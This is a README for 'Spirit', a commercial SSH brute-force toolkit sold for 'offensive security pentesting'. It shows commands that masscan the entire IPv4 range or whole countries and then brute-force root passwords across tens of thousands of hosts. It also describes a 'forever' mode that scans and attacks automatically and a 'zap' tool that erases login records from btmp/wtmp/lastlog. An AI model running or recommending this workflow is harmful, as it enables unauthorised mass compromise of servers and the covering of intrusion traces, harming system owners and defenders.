# Spirit - smart SSH brute toolkit
> Spirit tries 1 USER:PASS per HOST cycling through all the hosts and removing unreachable or filtered hosts. Each password attempt fewer hosts are being tried as the logic removes non-vulnerable hosts from the attack surface, this greatly increases the efficiency and speed of the brute-force attack.

We created this toolkit to speed up our offensive security pentesting tasks.
In Spirit you will find various tools beside the main SSH brute feature:
- brute (passfile)
- brute (privateKeys)
- banner (grabs SSH banners without performing a login)
- omni (connect to all your hosts at once)
- omni (privateKey) (connect to all your hosts at once using privateKey)

- masscan --country cn --ports 21,22,23 (masscan whole country using sane defaults)
- scan (basic TCP network scan [unprivileged]) (Beta) [`donate to improve`](#monero-xmr-thank-you)
- swarm (brute in distributed fashion [Under Development]) [`donate to speed things up`](#monero-xmr-thank-you)

- parse (parses masscan -oG output and creates h.lst in IP:PORT format)
- ports (generate random ports between 1 and 65535, excluding 22)
- abuse (checks your host against abuse databases)
- zap (removes connections logs from btmp/wtmp/utmp/lastlog/...)

And more... check out the helpfile [`$ ./spirit --help`](./HELP)

## Example usage
```bash
$ masscan --rate="50000" --ports "22,222,2222,2212" 0.0.0.0/0 --exclude 255.255.255.255 -oG open.lst
Scanning 4294967295 hosts [4 ports/host]

$ ./spirit parse open.lst
INFO created h.lst in HOST:PORT format

$ ./spirit banner
SSH-2.0-OpenSSH_8.2p  13% [=>                  ] (3686/26803) [11s:1m15s]
INFO created b.lst in HOST:PORT:BANNER format

$ mv b.lst h.lst

$ ./spirit
INFO loaded h.lst with 26803 hosts
INFO loaded p.lst with 4881 logins
root:!1qwerty 192.168.0.1:22 found [77] blocked [33] 20% [====>            ] [20s:1h13m36s]

Tip: you can automate these steps with ./spirit auto
Tip: you can run ./spirit forever to run masscan on random ports and automatically brute
```

## Download the latest Spirit release
- wget https://github.com/aogspirit/spirit/raw/master/spirit.tgz
- curl -OL https://github.com/aogspirit/spirit/raw/master/spirit.tgz

## Self Upgrade
```bash
./spirit upgrade

Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
```
>*Spirit can self-upgrade only on amd64 aka x86-64 for now. [`donate to speed things up`](#monero-xmr-thank-you)

## Spirit Pro
The main features require Pro licensing to help support the development of the project.
Licensing information can be found running `./spirit pro --info`

You can buy a license directly from the CLI `./spirit buy`

You can use Spirit free tools:
- banner
- parse
- scan
- zap
- and more...

# Support the Develpoment of the Spirit toolkit!
## Monero (XMR) thank you!
`8B81sxCMzoYc1cEu3EbHDfdCmtcooNtKp3sba9tGEpprM5PvADwXk76BFRRmuAUL2efvjm3Rp8uWHU5EULAPEbJGKoZ1x67`

## Bitcoin (BTC) thank you too!
`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`

## Support
If you have any issues with Spirit, feel free to contact us directly: \
on Telegram: https://t.me/aogspirit \
on IRC: #aog @ oftc.net \
or open a Github [issue](https://github.com/theaog/spirit/issues)
